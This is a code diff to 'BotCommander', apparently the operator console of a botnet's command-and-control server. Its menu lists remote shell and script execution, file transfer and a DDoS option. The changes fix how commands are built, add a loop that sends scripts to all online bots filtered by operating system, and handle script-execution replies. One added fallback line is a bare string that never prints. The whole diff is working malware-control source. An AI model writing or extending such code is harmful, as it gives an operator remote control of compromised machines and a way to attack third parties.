@@ -47,7 +47,7 @@ class BotCommander:
         Welcome to Commander CLI!
         The following options are available:
         1) Execute shell/cmd commands
-        2) Execute python script
+        2) Execute script
         3) Download File
         4) Upload File
         5) Perform DDOS attack         
@@ -201,7 +201,7 @@ class BotCommander:
                     continue
 
     async def __schedule_command(self, command, cmd_filter, *args):
-        payload = self.__json_builder(command, args)
+        payload = self.__json_builder(command, *args)
         if cmd_filter:
             for uuid in self.uuids:
                 if self.uuids[uuid].get("online") and self.uuids[uuid].get("os") == cmd_filter:
@@ -234,7 +234,7 @@ class BotCommander:
                     script_type = "powershell"
                     cmd_filter = "Windows"
                 case 2:
-                    script_type = "shell"
+                    script_type = "sh"
                     cmd_filter = "Linux"
                 case 3:
                     script_type = "python"
@@ -257,6 +257,15 @@ class BotCommander:
             with open(path_to_script, 'r') as fh:
                 data = fh.read()
             await self.__schedule_command("exeScript", cmd_filter, data, script_type, path_to_script)
+            msg = "Do you wish to send another script using the same options? [Y/N] "
+            choice = await asyncio.get_running_loop().run_in_executor(None, self.__get_user_input, msg)
+            match choice:
+                case "Y":
+                    continue
+                case "N":
+                    break
+                case _:
+                    "Please choose from Y and N next time..."
 
     def __perform_ddos(self):
         pass
@@ -392,6 +401,8 @@ class BotCommander:
                 else:
                     return False
             case "exeCommandReply":
+                return True
+            case "exeScriptReply":
                 return True
             case "putFileReply":
                 pass
